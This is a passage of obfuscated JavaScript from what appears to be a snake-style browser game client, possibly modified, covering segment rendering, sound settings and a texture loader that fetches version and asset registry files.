          _0x3b69a2.prototype.disableFlex = function () {
            this.pwr_flex1.xc.visible = false;
            this.pwr_flex2.xc.visible = false;
            this.pwr_flex3.xc.visible = false;
          };
          _0x3b69a2.prototype.WXX = function (_0x529711, _0x4fb6c5, _0x3be71b, _0x49a61a) {
            this.Nc.xc.visible = true;
            this.Nc.xc.alpha = _0x2c22d1.Q(this.Nc.xc.alpha, _0x529711.Xc ? 0.9 : 0.2, _0x49a61a, 0.0025);
            this.Nc.Tc(_0x4fb6c5);
          };
          _0x3b69a2.prototype.Oc = function () {
            this.Nc.xc.visible = false;
          };
          return _0x3b69a2;
        }();
        _0xcb8892.prototype.Yc = function (_0x204eb7) {
          var _0x25e0d1 = Math.PI * 0.1;
          return this.uc + this.vc * Math.sin(_0x204eb7 * _0x25e0d1 - this.tc);
        };
        _0xcb8892.prototype.Zc = function (_0x1aa061, _0x3c682a, _0x3cd496, _0x3a8d4d) {
          var _0x5fc607 = _0x1aa061.$c * 2;
          var _0x46a18a = _0x1aa061._c;
          var _0x1a77d1 = _0x1aa061.ad;
          var _0x9aff26 = _0x1a77d1 * 4 - 3;
          var _0x142174 = _0x9aff26;
          this.tc = _0x3c682a / 400 * Math.PI;
          this.uc = _0x5fc607 * 1.5;
          this.vc = _0x5fc607 * 0.15 * _0x1aa061.bd;
          var _0x1bafc6;
          var _0x1d04cd;
          var _0x263eb8;
          var _0x3ac0a7;
          var _0x3a4b97;
          var _0x4c1997;
          var _0xa010e;
          var _0x3780f1;
          _0x1d04cd = _0x46a18a[0];
          _0x4c1997 = _0x46a18a[1];
          if (_0x3a8d4d(_0x1d04cd, _0x4c1997)) {
            _0x263eb8 = _0x46a18a[2];
            _0xa010e = _0x46a18a[3];
            _0x3ac0a7 = _0x46a18a[4];
            _0x3780f1 = _0x46a18a[5];
            var _0x5e902c = Math.atan2(_0x3780f1 + _0x4c1997 * 2 - _0xa010e * 3, _0x3ac0a7 + _0x1d04cd * 2 - _0x263eb8 * 3);
            this.oc.Sc(_0x1d04cd, _0x4c1997, _0x5fc607, _0x5e902c);
            this.qc[0].Sc(_0x1d04cd, _0x4c1997, _0x5fc607, this.Yc(0), _0x5e902c);
            this.qc[1].Sc(_0x204fd8 * _0x1d04cd + _0x7e05e2 * _0x263eb8 + _0x217179 * _0x3ac0a7, _0x204fd8 * _0x4c1997 + _0x7e05e2 * _0xa010e + _0x217179 * _0x3780f1, _0x5fc607, this.Yc(1), _0x2ded01.cd(this.qc[0], this.qc[2]));
            this.qc[2].Sc(_0xb68e4f * _0x1d04cd + _0x183676 * _0x263eb8 + _0x393791 * _0x3ac0a7, _0xb68e4f * _0x4c1997 + _0x183676 * _0xa010e + _0x393791 * _0x3780f1, _0x5fc607, this.Yc(2), _0x2ded01.cd(this.qc[1], this.qc[3]));
            this.qc[3].Sc(_0x827e28 * _0x1d04cd + _0x1f0075 * _0x263eb8 + _0x1c3c91 * _0x3ac0a7, _0x827e28 * _0x4c1997 + _0x1f0075 * _0xa010e + _0x1c3c91 * _0x3780f1, _0x5fc607, this.Yc(3), _0x2ded01.cd(this.qc[2], this.qc[4]));
          } else {
            this.oc.Uc();
            this.qc[0].Uc();
            this.qc[1].Uc();
            this.qc[2].Uc();
            this.qc[3].Uc();
          }
          var _0x4c1d48 = 4;
          var _0x1c9950 = 2;
          var _0x10ca10 = _0x1a77d1 * 2 - 4;
          while (_0x1c9950 < _0x10ca10) {
            _0x1d04cd = _0x46a18a[_0x1c9950];
            _0x4c1997 = _0x46a18a[_0x1c9950 + 1];
            if (_0x3a8d4d(_0x1d04cd, _0x4c1997)) {
              _0x1bafc6 = _0x46a18a[_0x1c9950 - 2];
              _0x3a4b97 = _0x46a18a[_0x1c9950 - 1];
              _0x263eb8 = _0x46a18a[_0x1c9950 + 2];
              _0xa010e = _0x46a18a[_0x1c9950 + 3];
              _0x3ac0a7 = _0x46a18a[_0x1c9950 + 4];
              _0x3780f1 = _0x46a18a[_0x1c9950 + 5];
              this.qc[_0x4c1d48].Sc(_0x1d04cd, _0x4c1997, _0x5fc607, this.Yc(_0x4c1d48), _0x2ded01.cd(this.qc[_0x4c1d48 - 1], this.qc[_0x4c1d48 + 1]));
              _0x4c1d48++;
              this.qc[_0x4c1d48].Sc(_0x1a1b4b * _0x1bafc6 + _0xe298ab * _0x1d04cd + _0x385200 * _0x263eb8 + _0x19b4be * _0x3ac0a7, _0x1a1b4b * _0x3a4b97 + _0xe298ab * _0x4c1997 + _0x385200 * _0xa010e + _0x19b4be * _0x3780f1, _0x5fc607, this.Yc(_0x4c1d48), _0x2ded01.cd(this.qc[_0x4c1d48 - 1], this.qc[_0x4c1d48 + 1]));
              _0x4c1d48++;
              this.qc[_0x4c1d48].Sc(_0x50ad8a * _0x1bafc6 + _0x174bf1 * _0x1d04cd + _0x174bf1 * _0x263eb8 + _0x50ad8a * _0x3ac0a7, _0x50ad8a * _0x3a4b97 + _0x174bf1 * _0x4c1997 + _0x174bf1 * _0xa010e + _0x50ad8a * _0x3780f1, _0x5fc607, this.Yc(_0x4c1d48), _0x2ded01.cd(this.qc[_0x4c1d48 - 1], this.qc[_0x4c1d48 + 1]));
              _0x4c1d48++;
              this.qc[_0x4c1d48].Sc(_0x19b4be * _0x1bafc6 + _0x385200 * _0x1d04cd + _0xe298ab * _0x263eb8 + _0x1a1b4b * _0x3ac0a7, _0x19b4be * _0x3a4b97 + _0x385200 * _0x4c1997 + _0xe298ab * _0xa010e + _0x1a1b4b * _0x3780f1, _0x5fc607, this.Yc(_0x4c1d48), _0x2ded01.cd(this.qc[_0x4c1d48 - 1], this.qc[_0x4c1d48 + 1]));
              _0x4c1d48++;
            } else {
              this.qc[_0x4c1d48].Uc();
              _0x4c1d48++;
              this.qc[_0x4c1d48].Uc();
              _0x4c1d48++;
              this.qc[_0x4c1d48].Uc();
              _0x4c1d48++;
              this.qc[_0x4c1d48].Uc();
              _0x4c1d48++;
            }
            _0x1c9950 += 2;
          }
          _0x1d04cd = _0x46a18a[_0x1a77d1 * 2 - 4];
          _0x4c1997 = _0x46a18a[_0x1a77d1 * 2 - 3];
          if (_0x3a8d4d(_0x1d04cd, _0x4c1997)) {
            _0x1bafc6 = _0x46a18a[_0x1a77d1 * 2 - 6];
            _0x3a4b97 = _0x46a18a[_0x1a77d1 * 2 - 5];
            _0x263eb8 = _0x46a18a[_0x1a77d1 * 2 - 2];
            _0xa010e = _0x46a18a[_0x1a77d1 * 2 - 1];
            this.qc[_0x9aff26 - 5].Sc(_0x1d04cd, _0x4c1997, _0x5fc607, this.Yc(_0x9aff26 - 5), _0x2ded01.cd(this.qc[_0x9aff26 - 6], this.qc[_0x9aff26 - 4]));
            this.qc[_0x9aff26 - 4].Sc(_0x1c3c91 * _0x1bafc6 + _0x1f0075 * _0x1d04cd + _0x827e28 * _0x263eb8, _0x1c3c91 * _0x3a4b97 + _0x1f0075 * _0x4c1997 + _0x827e28 * _0xa010e, _0x5fc607, this.Yc(_0x9aff26 - 4), _0x2ded01.cd(this.qc[_0x9aff26 - 5], this.qc[_0x9aff26 - 3]));
            this.qc[_0x9aff26 - 3].Sc(_0x393791 * _0x1bafc6 + _0x183676 * _0x1d04cd + _0xb68e4f * _0x263eb8, _0x393791 * _0x3a4b97 + _0x183676 * _0x4c1997 + _0xb68e4f * _0xa010e, _0x5fc607, this.Yc(_0x9aff26 - 3), _0x2ded01.cd(this.qc[_0x9aff26 - 4], this.qc[_0x9aff26 - 2]));
            this.qc[_0x9aff26 - 2].Sc(_0x217179 * _0x1bafc6 + _0x7e05e2 * _0x1d04cd + _0x204fd8 * _0x263eb8, _0x217179 * _0x3a4b97 + _0x7e05e2 * _0x4c1997 + _0x204fd8 * _0xa010e, _0x5fc607, this.Yc(_0x9aff26 - 2), _0x2ded01.cd(this.qc[_0x9aff26 - 3], this.qc[_0x9aff26 - 1]));
            this.qc[_0x9aff26 - 1].Sc(_0x263eb8, _0xa010e, _0x5fc607, this.Yc(_0x9aff26 - 1), _0x2ded01.cd(this.qc[_0x9aff26 - 2], this.qc[_0x9aff26 - 1]));
          } else {
            this.qc[_0x9aff26 - 5].Uc();
            this.qc[_0x9aff26 - 4].Uc();
            this.qc[_0x9aff26 - 3].Uc();
            this.qc[_0x9aff26 - 2].Uc();
            this.qc[_0x9aff26 - 1].Uc();
          }
          if (this.pc === 0 && _0x142174 > 0) {
            this.nc.addChild(this.oc);
          }
          if (this.pc > 0 && _0x142174 === 0) {
            _0x2c22d1.U(this.oc);
          }
          while (this.pc < _0x142174) {
            this.nc.addChild(this.qc[this.pc].Cc.Qc());
            this.nc.addChild(this.qc[this.pc].Dc.Qc());
            this.pc += 1;
          }
          while (this.pc > _0x142174) {
            this.pc -= 1;
            this.qc[this.pc].Dc.Rc();
            this.qc[this.pc].Cc.Rc();
          }
          var _0x4627f1 = _0x1aa061.dd[_0x31b4a1.fd.ed];
          if (this.qc[0].gd() && _0x4627f1 && _0x4627f1.hd) {
            this.oc.Vc(_0x1aa061, _0x5fc607, _0x3c682a, _0x3cd496);
          } else {
            this.oc.Mc();
          }
          var _0x8bd7b7 = _0x1aa061.dd[_0x31b4a1.fd.jd];
          if (this.qc[0].gd() && _0x8bd7b7 && _0x8bd7b7.hd) {
            this.oc.Wc(_0x1aa061, _0x5fc607, _0x3c682a, _0x3cd496);
          } else {
            this.oc.Oc();
          }
          var _0x46a0d6 = _0x1aa061.dd[_0x31b4a1.fd.pd];
          if (this.qc[0].gd() && _0x46a0d6 != null && _0x46a0d6.hd) {
            this.oc.activeFlex(_0x1aa061, _0x5fc607, _0x3c682a, _0x3cd496);
          } else {
            this.oc.disableFlex();
          }
          movimentaLinha();
        };
        var _0x2ded01 = function () {
          function _0x3297e3(_0x1768d4, _0x4f45e9) {
            this.Cc = _0x1768d4;
            this.Cc.kd(false);
            this.Dc = _0x4f45e9;
            this.Dc.kd(false);
            this.ev = null;
          }
          _0x3297e3.prototype.Sc = function (_0xbe7185, _0x42741d, _0x366300, _0x25d3b7, _0xb2c589) {
            this.Cc.kd(true);
            this.Cc.ld(_0xbe7185, _0x42741d);
            this.Cc.Tc(_0x366300);
            this.Cc.md(_0xb2c589);
            this.Dc.kd(true);
            this.Dc.ld(_0xbe7185, _0x42741d);
            this.Dc.Tc(_0x25d3b7);
            this.Dc.md(_0xb2c589);
          };
          _0x3297e3.prototype.Uc = function () {
            this.Cc.kd(false);
            this.Dc.kd(false);
          };
          _0x3297e3.prototype.gd = function () {
            return this.Cc.gd();
          };
          _0x3297e3.cd = function (_0x143bd7, _0x15717f) {
            return Math.atan2(_0x143bd7.Cc.xc.position.y - _0x15717f.Cc.xc.position.y, _0x143bd7.Cc.xc.position.x - _0x15717f.Cc.xc.position.x);
          };
          return _0x3297e3;
        }();
        return _0xcb8892;
      }();
      _0x31b4a1.fd = function () {
        function _0x4b9622(_0x118bda) {
          this.nd = _0x118bda;
          this.hd = false;
          this.od = 1;
        }
        _0x4b9622.jd = 0;
        _0x4b9622.pd = 1;
        _0x4b9622.ed = 2;
        _0x4b9622.qd = 6;
        _0x4b9622.rd = 3;
        _0x4b9622.sd = 4;
        _0x4b9622.td = 5;
        return _0x4b9622;
      }();
      _0x31b4a1.Ab = function (_0x25874e) {
        var _0x4bbc59 = function () {
          function _0x42c39b(_0x2476b6, _0x49e701) {
            _0x1c69e7(this, _0x42c39b);
            this.ud = _0x2476b6;
            this.vd = _0x49e701;
          }
          return _0x3b69b0(_0x42c39b, [{
            key: "Jb",
            value: function _0x50a681() {
              return this.ud.revision;
            }
          }, {
            key: "Yb",
            value: function _0x5c0689() {
              _0x261341.Jb();
              return this.ud;
            }
          }, {
            key: "Ub",
            value: function _0xd886bb() {
              return this.vd;
            }
          }]);
        }();
        _0x25874e = _0x4bbc59;
        _0x5078aa(_0x4bbc59, "wd", new _0x25874e({}, _0x31b4a1.Ga.Ca()));
        return _0x4bbc59;
      }();
      _0x31b4a1.Mb = function () {
        function _0x1881da(_0x3f81c3) {
          this.xd = function () {
            ++_0x1881da.yd;
            return function (_0x4422d2, _0x12f178) {};
          }();
          this.zd = _0x3f81c3;
          this.Ad = null;
          this.Bd = null;
          this.Cd = null;
          this.Dd = null;
          this.Ed = null;
          this.Fd = false;
          this.Gd = false;
          this.Hd = false;
        }
        _0x1881da.Id = {
          Jd: "0x0",
          Kd: "0x1",
          Ld: "0x2",
          Md: "0x3",
          Nd: "0x4"
        };
        _0x1881da.yd = 100000;
        _0x1881da.Od = new _0x31b4a1._b.cc().ec(_0x1881da.Id.Jd, 1).ec(_0x1881da.Id.Kd, 10).ec(_0x1881da.Id.Ld, 50).ec(_0x1881da.Id.Md, 15).ec(_0x1881da.Id.Nd, 5).hc();
        _0x1881da.prototype.Rb = function (_0x533e70) {
          this.Ad = _0x533e70;
        };
        _0x1881da.prototype.Qb = function (_0xc7ebe3) {
          this.Bd = _0xc7ebe3;
        };
        _0x1881da.prototype.Ob = function (_0x1a3977) {
          this.Cd = _0x1a3977;
        };
        _0x1881da.prototype.Pb = function (_0x4cc336) {
          this.Dd = _0x4cc336;
        };
        _0x1881da.prototype.Nb = function (_0x4dbfd9) {
          this.Ed = _0x4dbfd9;
        };
        _0x1881da.prototype.Kb = function () {
          return this.Hd;
        };
        _0x1881da.prototype.Lb = function () {
          this.Fd = true;
        };
        _0x1881da.prototype.Vb = function () {
          if (!this.Gd) {
            this.Gd = true;
            if (this.Fd) {
              this.Pd();
              return;
            }
            this.Qd();
          }
        };
        _0x1881da.prototype.Qd = function () {
          function _0x2a9100(_0x53c284) {
            var _0x3ce605 = _0x1881da.Id.Jd;
            _0x38b31a.Rd(_0x3ce605, _0x1881da.Od.bc(_0x3ce605).lc(_0x53c284));
          }
          var _0x38b31a = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          $.ajax({
            type: "GET",
            url: _0x2c22d1.a.c + "/dynamic/assets/revision.json",
            xhrFields: {
              onprogress: function _0x533071(_0x255850) {
                if (_0x255850.lengthComputable) {
                  _0x2a9100(_0x255850.loaded / _0x255850.total);
                }
              }
            }
          }).fail(function () {
            _0x38b31a.Sd(new Error());
          }).done(function (_0x58a3e4) {
            if (_0x58a3e4 <= _0x38b31a.zd) {
              _0x38b31a.Td();
              return;
            }
            _0x38b31a.Ud();
          });
        };
        _0x1881da.prototype.Ud = _0x16316f(_0x51aacb().mark(function _0x24e9d5() {
          var _0x48de64;
          var _0x3bd352;
          var _0x2521ea;
          return _0x51aacb().wrap(function _0x36a99a(_0xf5e76) {
            while (1) {
              switch (_0xf5e76.prev = _0xf5e76.next) {
                case 0:
                  _0x48de64 = function _0x52efae(_0x1c6154) {
                    var _0x36f535 = _0x1881da.Id.Kd;
                    _0x3bd352.Rd(_0x36f535, _0x1881da.Od.bc(_0x36f535).lc(_0x1c6154));
                  };
                  _0x3bd352 = this;
                  if (!this.Fd) {
                    _0xf5e76.next = 4;
                    break;
                  }
                  return _0xf5e76.abrupt("return", void this.Pd());
                case 4:
                  _0xf5e76.next = 6;
                  return fetch(window.vps.s_l + "/version");
                case 6:
                  _0x2521ea = _0xf5e76.sent;
                  _0xf5e76.next = 9;
                  return _0x2521ea.json();
                case 9:
                  _0x2521ea = _0xf5e76.sent;
                  localStorage.setItem("wup_version", _0x2521ea);
                  if (_0x1e1393 != _0x2521ea) {
                    $.ajax({
                      type: "GET",
                      url: _0x2c22d1.a.c + "/dynamic/assets/registry.json",
                      xhrFields: {
                        onprogress: function _0x33f241(_0x1ecb59) {
                          if (_0x1ecb59.lengthComputable) {
                            _0x48de64(_0x1ecb59.loaded / _0x1ecb59.total);
                          }
                        }
                      }
                    }).fail(function () {
                      _0x3bd352.Sd(new Error());
                    }).done(function () {
                      var _0x50c63c = _0x16316f(_0x51aacb().mark(function _0x4e4d64(_0x335e62) {
                        return _0x51aacb().wrap(function _0x5e90cd(_0x238f21) {
                          while (1) {
                            switch (_0x238f21.prev = _0x238f21.next) {
                              case 0:
                                _0x238f21.next = 2;
                                return _0x261341.registry(_0x335e62);
                              case 2:
                                _0x335e62 = _0x238f21.sent;
                                localStorage.setItem("wup_config", JSON.stringify(_0x335e62));
                                _0x3bd352.Vd(_0x335e62, _0x1881da);
                              case 5:
                              case "end":
                                return _0x238f21.stop();
                            }
                          }
                        }, _0x4e4d64);
                      }));
                      return function (_0x9b91f7) {
                        return _0x50c63c.apply(this, arguments);
                      };
                    }());
                  } else {
                    try {
                      _0x1cdd44 = JSON.parse(_0x1cdd44);
                      _0x48de64(1);
                      _0x3bd352.Vd(_0x1cdd44, _0x1881da);
                    } catch (_0x4ec704) {
                      localStorage.removeItem("wup_version");
                      localStorage.removeItem("wup_config");
                    }
                  }
                case 12:
                case "end":
                  return _0xf5e76.stop();
              }
            }
          }, _0x24e9d5, this);
        }));
        _0x1881da.prototype.Vd = _0x261341.Vd || function (_0x476fff) {
          function _0x343dda(_0x25e9b1) {
            var _0x443662 = _0x1881da.Id.Ld;
            _0x10054f.Rd(_0x443662, _0x1881da.Od.bc(_0x443662).lc(_0x25e9b1));
          }
          var _0x10054f = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          var _0x1c1279 = [];
          var _0x39c950 = [];
          var _0x357b6f = 0;
          for (var _0x290b89 in _0x476fff.textureDict) {
            if (_0x476fff.textureDict.hasOwnProperty(_0x290b89)) {
              var _0x169a75 = _0x476fff.textureDict[_0x290b89];
              var _0xe422d3 = _0x2c22d1.a.c + _0x169a75.relativePath;
              var _0x42e649 = _0x169a75.fileSize;
              var _0x285f3 = _0x169a75.sha256;
              var _0x58df36 = new _0x1881da.Wd(_0x290b89, _0xe422d3, _0x42e649, _0x285f3);
              _0x1c1279.push(_0x58df36);
              _0x39c950.push(_0x58df36);
              _0x357b6f += _0x42e649;
            }
          }
          var _0x479ae5;
          var _0x119b8b = 0;
          var _0x389a13 = function _0x4e5f89(_0x5cc2fc) {
            for (var _0x320a40 = 0; _0x320a40 < _0x39c950.length; _0x320a40++) {
              try {
                window.URL.revokeObjectURL(_0x39c950[_0x320a40].Xd);
              } catch (_0xcf240a) {}
            }
            _0x10054f.Sd(_0x5cc2fc);
          };
          var _0x96977b = function _0x578354(_0x59a494) {
            var _0x1c6b92 = Math.floor(_0x479ae5.Yd * _0x59a494);
            _0x343dda((_0x119b8b + _0x1c6b92) / _0x357b6f);
          };
          var _0x448bd3 = function _0x14ed7c(_0x23bd23) {
            var _0x10fa49 = new Blob([_0x23bd23]);
            _0x479ae5.Xd = window.URL.createObjectURL(_0x10fa49);
            _0x119b8b += _0x479ae5.Yd;
            _0x51419d();
          };
          var _0x51419d = function _0x509912() {
            if (_0x285e51 < _0x39c950.length) {
              _0x479ae5 = _0x39c950[_0x285e51++];
              _0x10054f.Zd(_0x479ae5, _0x389a13, _0x448bd3, _0x96977b);
              return;
            }
            setTimeout(function () {
              return _0x10054f.$d(_0x476fff, _0x1c1279);
            }, 0);
          };
          var _0x285e51 = 0;
          _0x51419d();
        };
        _0x1881da.prototype.Zd = _0x261341.Zd || function (_0x1e014c, _0x20eed4, _0x17bfd3, _0x55928e) {
          $.ajax({
            type: "GET",
            url: _0x1e014c._d,
            xhrFields: {
              responseType: "arraybuffer",
              onprogress: function _0x321047(_0x564e99) {
                if (_0x564e99.lengthComputable) {
                  _0x55928e(_0x564e99.loaded / _0x564e99.total);
                }
              }
            }
          }).fail(function () {
            _0x20eed4(new Error());
          }).done(function (_0x2a83e6) {
            _0x17bfd3(_0x2a83e6);
          });
        };
        _0x1881da.prototype.$d = _0x261341.$d || function (_0x134122, _0x1e996e) {
          function _0x1caab3(_0x2849e2) {
            var _0x2b2af1 = _0x1881da.Id.Md;
            _0x127b28.Rd(_0x2b2af1, _0x1881da.Od.bc(_0x2b2af1).lc(_0x2849e2));
          }
          var _0x127b28 = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          var _0xa77d5d;
          var _0x542c4d;
          var _0x1ee0a4 = {};
          var _0x69eb36 = function _0x12d1c8() {
            for (var _0x246eb1 = 0; _0x246eb1 < _0x1e996e.length; _0x246eb1++) {
              try {
                window.URL.revokeObjectURL(_0x1e996e[_0x246eb1].Xd);
              } catch (_0x45f60f) {}
            }
            _0x127b28.Sd(new Error());
          };
          var _0x42cd87 = function _0x1f81d7() {
            _0x1caab3(_0xac49d4 / _0x1e996e.length);
            _0x1ee0a4[_0xa77d5d.ae] = new _0x31b4a1.be(_0xa77d5d.Xd, _0x542c4d);
            _0x4c80d0();
          };
          var _0x4c80d0 = function _0x10d9c4() {
            if (_0xac49d4 < _0x1e996e.length) {
              _0xa77d5d = _0x1e996e[_0xac49d4++];
              _0x542c4d = PIXI.BaseTexture.from(_0xa77d5d.Xd);
              _0x542c4d.on("error", _0x69eb36);
              _0x542c4d.on("loaded", _0x42cd87);
              return;
            }
            setTimeout(function () {
              return _0x127b28.ce(_0x134122, _0x1ee0a4);
            }, 0);
          };
          var _0xac49d4 = 0;
          _0x4c80d0();
        };
        _0x1881da.prototype.ce = function (_0x351af3, _0x273184) {
          function _0x5371d5(_0x50287d) {
            var _0x5cac03 = _0x1881da.Id.Nd;
            _0x220ef5.Rd(_0x5cac03, _0x1881da.Od.bc(_0x5cac03).lc(_0x50287d));
          }
          var _0x220ef5 = this;
          var _0x2d120d = {};
          var _0x1d8049 = 0;
          var _0x52cc2c = Object.values(_0x351af3.regionDict).length;
          _0x2c22d1._(_0x351af3.regionDict, function (_0x2c91a7, _0x3d1514) {
            var _0x233235 = null;
            try {
              var _0xffafb = null;
              if (_0x273184[_0x3d1514.texture].ev) {
                _0xffafb = _0x273184[_0x3d1514.texture].ev;
              }
              var _0x210cd6 = _0x3d1514.texture + ":" + _0x2c91a7;
              _0x233235 = _0x31b4a1.la.Da(_0x210cd6, _0x273184[_0x3d1514.texture].oa, _0x3d1514, _0xffafb);
              _0x2d120d[_0x2c91a7] = _0x233235;
              if (++_0x1d8049 % 10 == 0) {
                _0x5371d5(_0x1d8049 / _0x52cc2c);
              }
            } catch (_0x52facc) {}
          });
          var _0x347537 = Object.values(_0x273184).map(function (_0x449ddd) {
            return _0x449ddd.oa;
          });
          var _0x75ef11 = Object.values(_0x2d120d);
          var _0x6c3bcc = new _0x31b4a1.Ab(_0x351af3, _0x31b4a1.Ga.fb(_0x351af3, _0x2d120d, _0x347537, _0x75ef11));
          setTimeout(function () {
            return _0x220ef5.de(_0x6c3bcc);
          }, 0);
        };
        _0x1881da.Wd = function () {
          function _0x51809e(_0x9569c4, _0x542b88, _0xcd3fbc, _0x2b1821) {
            this.ae = _0x9569c4;
            this._d = _0x542b88;
            this.Yd = _0xcd3fbc;
            this.ee = _0x2b1821;
            this.Xd = "";
          }
          return _0x51809e;
        }();
        _0x1881da.prototype.de = function (_0x3ab6bc) {
          if (this.Hd) {
            _0x3ab6bc.Ub().Fa();
            return;
          }
          this.Hd = true;
          var _0x13d46b = this;
          setTimeout(function () {
            return _0x13d46b.Ad(_0x3ab6bc);
          }, 0);
        };
        _0x1881da.prototype.Td = function () {
          if (!this.Hd) {
            this.Hd = true;
            var _0x19400a = this;
            setTimeout(function () {
              return _0x19400a.Bd();
            }, 0);
          }
        };
        _0x1881da.prototype.Sd = function (_0x497693) {
          if (!this.Hd) {
            this.Hd = true;
            var _0x599dfe = this;
            setTimeout(function () {
              return _0x599dfe.Cd(_0x497693);
            }, 0);
          }
        };
        _0x1881da.prototype.Pd = function () {
          if (!this.Hd) {
            this.Hd = true;
            var _0x3e537e = this;
            setTimeout(function () {
              return _0x3e537e.Dd();
            }, 0);
          }
        };
        _0x1881da.prototype.Rd = function (_0x2efd67, _0x15e7f0) {
          if (!this.Hd && !this.Fd) {
            var _0x36bbab = this;
            return _0x36bbab.Ed(_0x2efd67, _0x15e7f0);
          }
        };
        return _0x1881da;
      }();
      _0x31b4a1.fe = function () {
        return {};
      }();
      _0x31b4a1.ge = function () {
        function _0x15e061() {
          this.he = _0x31b4a1.ge.je.ie;
          this.ke = false;
          this.le = false;
          this.me = null;
          this.ne = null;
        }
        _0x15e061.prototype.ha = function () {};
        _0x15e061.prototype.oe = function (_0x2fb5af) {
          this.le = _0x2fb5af;
        };
        _0x15e061.prototype.pe = function (_0x39968b) {
          this.he = _0x39968b;
          this.qe();
        };
        _0x15e061.prototype.re = function (_0x227acb) {
          this.ke = _0x227acb;
          this.qe();
        };
        _0x15e061.prototype.qe = function () {};
        _0x15e061.prototype.se = function (_0x19eb9a, _0xd6f321) {
          if (!_0xe610a0().Lc.Wb()) {
            return null;
          }
          var _0xb62419 = _0x19eb9a[_0xd6f321];
          if (_0xb62419 == null || _0xb62419.length === 0) {
            return null;
          } else {
            return _0xb62419[Math.floor(Math.random() * _0xb62419.length)].cloneNode();
          }
        };
        _0x15e061.prototype.te = function (_0x3586e3, _0x1ac562, _0x10823a) {
          if (this.le && !(_0x10823a <= 0)) {
            var _0x5f5a22 = this.se(_0x3586e3, _0x1ac562);
            if (_0x5f5a22 != null) {
              _0x5f5a22.volume = Math.min(1, _0x10823a);
              _0x5f5a22.play();
            }
          }
        };
        _0x15e061.prototype.ue = function (_0x30e368, _0x28162b) {
          if (this.he.ve) {
            this.te(_0x31b4a1.xe.we, _0x30e368, _0x28162b);
          }
        };
        _0x15e061.prototype.ye = function (_0x5a6423, _0x510a6b) {
          if (this.he.ze) {
            this.te(_0x31b4a1.xe.Ae, _0x5a6423, _0x510a6b);
          }
        };
        _0x15e061.prototype.Be = function () {};
        _0x15e061.prototype.Ce = function () {};
        _0x15e061.prototype.De = function () {};
        _0x15e061.prototype.Ee = function () {};
        _0x15e061.prototype.Fe = function () {};
        _0x15e061.prototype.Ge = function () {};
        _0x15e061.prototype.He = function (_0x3feb55, _0x1e3184, _0x4b099c) {};
        _0x15e061.prototype.Ie = function (_0x427b02) {};
        _0x15e061.prototype.Je = function (_0x5edcc7) {};
        _0x15e061.prototype.Ke = function (_0x3bb4d0) {};
        _0x15e061.prototype.Le = function (_0x47b517) {};
        _0x15e061.prototype.Me = function (_0x384bd6) {};
        _0x15e061.prototype.Ne = function (_0x61d1ea) {};
        _0x15e061.prototype.Oe = function (_0x1ec5c1) {};
        _0x15e061.prototype.Pe = function (_0x1fbfd6) {};
        _0x15e061.prototype.Qe = function (_0x5d71f5) {};
        _0x15e061.prototype.Re = function (_0xbcfd52) {};
        _0x15e061.prototype.Se = function (_0x5d4c50) {};
        _0x15e061.prototype.Te = function (_0x209bad) {};
        _0x15e061.prototype.Ue = function (_0x4d13db) {};
        _0x15e061.prototype.Ve = function (_0x292965) {};
        _0x15e061.prototype.We = function (_0x274327, _0x41c783) {};
        _0x15e061.prototype.Xe = function (_0x39e9bc) {};
        _0x15e061.prototype.Ye = function (_0x3c1115, _0x242043, _0xa26abb) {};
        _0x15e061.je = {
          ie: {
            Ze: false,
            $e: false,
            ze: true,
            ve: false
          },
          _e: {
            Ze: false,
            $e: true,
            ze: true,
            ve: false
          },
          af: {
            Ze: true,
            $e: false,
            ze: false,
            ve: true
          },
          bf: {
            Ze: false,
            $e: false,
            ze: true,
            ve: false
          },
          cf: {
            Ze: false,
            $e: false,
            ze: false,
            ve: false
          }
        };
        return _0x15e061;
      }();
      _0x31b4a1.GameView = function () {
        function _0x2059a0(_0x5ae051) {
          var _0x583e2a = _0xe610a0();
          this.ef = _0x5ae051;
          this.Eb = _0x5ae051.get()[0];
          this.ff = 1;
          this.gf = 1;
          this.hf = null;
          this.lf = new _0x131478.Renderer({
            view: _0x5ae051.get()[0],
            backgroundColor: 0,
            transparent: false,
            antialias: false,
            autoResize: true
          });
          this.mf = new _0x131478.Container();
          this.mf.sortableChildren = true;
          this.nf = new _0x131478.Container();
          this.nf.zIndex = 0;
          this.mf.addChild(this.nf);
          this.uf = new _0x131478.Container();
          this.uf.zIndex = 3;
          this.mf.addChild(this.uf);
          this.vf = [];
          this.wf = [];
          this.xf = [];
          this.ha();
        }
        var _0x596cbc = 0;
        var _0x3f1ee3 = 5;
        var _0x1e2901 = [{
          yf: 1,
          zf: 0.15,
          Af: 0
        }, {
          yf: 1,
          zf: 0.125,
          Af: 0
        }, {
          yf: 1,
          zf: 0.1,
          Af: 0
        }, {
          yf: 1,
          zf: 0.075,
          Af: 0
        }, {
          yf: 1,
          zf: 0.05,
          Af: 0
        }, {
          yf: 1,
          zf: 0.025,
          Af: 0
        }, {
          yf: 1,
          zf: 0,
          Af: 0.025
        }, {
          yf: 1,
          zf: 0,
          Af: 0.05
        }, {
          yf: 1,
          zf: 0,
          Af: 0.075
        }, {
          yf: 1,
          zf: 0,
          Af: 0.1
        }, {
          yf: 1,
          zf: 0,
          Af: 0.125
        }, {
          yf: 1,
          zf: 0,
          Af: 0.15
        }];
        _0x2059a0.prototype.ha = function () {
          var _0x2963d8 = _0xe610a0();
          this.lf.backgroundColor = _0x596cbc;
          this.vf = new Array(_0x1e2901.length);
          for (var _0x34717 = 0; _0x34717 < this.vf.length; _0x34717++) {
            this.vf[_0x34717] = new _0x131478.Sprite();
            this.vf[_0x34717].texture = _0x2963d8.xe.Bf;
            this.vf[_0x34717].anchor.set(0.5);
            this.nf.addChild(this.vf[_0x34717]);
          }
          this.wf = new Array(_0x2963d8.xe.Cf.length);
          for (var _0x31d10a = 0; _0x31d10a < this.wf.length; _0x31d10a++) {
            this.wf[_0x31d10a] = new _0x131478.Sprite();
            this.wf[_0x31d10a].texture = _0x2963d8.xe.Cf[_0x31d10a];
            this.wf[_0x31d10a].anchor.set(0.5);
            this.uf.addChild(this.wf[_0x31d10a]);
          }
          this.xf = new Array(this.wf.length);
          for (var _0x4a6e62 = 0; _0x4a6e62 < this.xf.length; _0x4a6e62++) {
            var _0xe4b8ac = [0.6, 1, 0.5];
            this.xf[_0x4a6e62] = {
